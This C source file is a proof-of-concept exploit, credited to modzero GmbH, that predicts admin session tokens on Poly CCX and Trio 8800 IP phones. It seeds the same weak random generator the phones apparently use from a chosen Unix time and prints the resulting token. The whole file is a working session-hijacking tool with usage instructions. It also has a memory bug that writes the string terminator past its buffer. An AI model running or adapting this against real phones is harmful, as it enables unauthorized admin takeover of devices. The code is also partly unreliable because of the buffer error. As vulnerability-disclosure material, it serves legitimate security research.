// Proof of Concept exploit - Admin Session Prediction in Poly IP phones
// Copyright (C) 2023, modzero GmbH
// gcc -Wall -o poc poc-rand.c
// 

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <string.h>

typedef enum _device_t {
    CCX,
    TRIO8800,
    UNKNOWN
} device_t;

int main(int argc, char* argv[]) {
    
    device_t t = UNKNOWN;
    
    if (argc != 3) {
        printf("Usage: %s <device> <epoch>\n", argv[0]);
        printf("[*] Please provide the target device type and Unix epoch in seconds\n");
        printf("[*] for the time you want to generate an authenticaton token for.\n");
        printf("[*] Possible target device types:\n"); 
        printf("    CCX\n");
        printf("    TRIO8800\n");
        printf("[*] Example:\n");    
        printf("    %s CCX 1692368144\n", argv[0]);        
        return -1;
    }

    char* arg = argv[2];
    char* argp = 0;
    
    unsigned long epoch = strtoul(arg, &argp, 10);

    if(strncmp("CCX", argv[1], 6) == 0)
        t = CCX;
    else if(strncmp("TRIO8800", argv[1], 8) == 0)
        t = TRIO8800;

    unsigned int stringLength = 0x1f;
    unsigned int stringCounter = stringLength;
    char newChar;
    int randNum;
    bool bVar2;
    float fVar3;
    unsigned int uVar4;
    char *randomStringPtr = (char *) malloc(stringLength + 1);
    char *finalString = randomStringPtr;
    unsigned int r0 = (epoch >> 0) & 0xff;
    unsigned int r1 = (epoch >> 8) & 0xff;
    unsigned int r2 = (epoch >> 16) & 0xff;
    unsigned int r3 = (epoch >> 24) & 0xff;
    r1 = r1 + (r0 << 7);
    r0 = r1 ^ r0;
    r1 = r2 + (r0 << 7);
    r0 = r1 ^ r0;
    r1 = r3 + (r0 << 7);
    r0 = r1 ^ r0;
    
    if(t==CCX)
        srand(r0);
    else if(t==TRIO8800)
        srand48(r0);
    else {
        printf("[!] Unknown device type %s\n", argv[1]);
        return(-2);
    }
        
    if (stringLength != 0) {
        
        do {
            
            if(t==CCX)
                randNum = rand();
            else if(t==TRIO8800)
                randNum = lrand48();
        
            stringCounter = stringCounter - 1;
            fVar3 = (float)(long long)randNum * 62.0 * 4.656613e-10;
            uVar4 = (unsigned int)(0.0 < fVar3) * (int)fVar3;
            
            if (uVar4 < 0x34) {
                bVar2 = uVar4 < 0x1a;
                if (bVar2) {
                    uVar4 = uVar4 + 0x61;
                }
                newChar = (char)uVar4;
                if (!bVar2) {
                    newChar = newChar + '\'';
                }
            }
            else {
                newChar = (char)uVar4 + -4;
            }
            
            *randomStringPtr = newChar;
            randomStringPtr = randomStringPtr + 1;
            
        } while (stringCounter != 0);
        
        randomStringPtr = randomStringPtr + stringLength;
    }
    *randomStringPtr = '\0';
    printf("00000000-%s\n", finalString);
}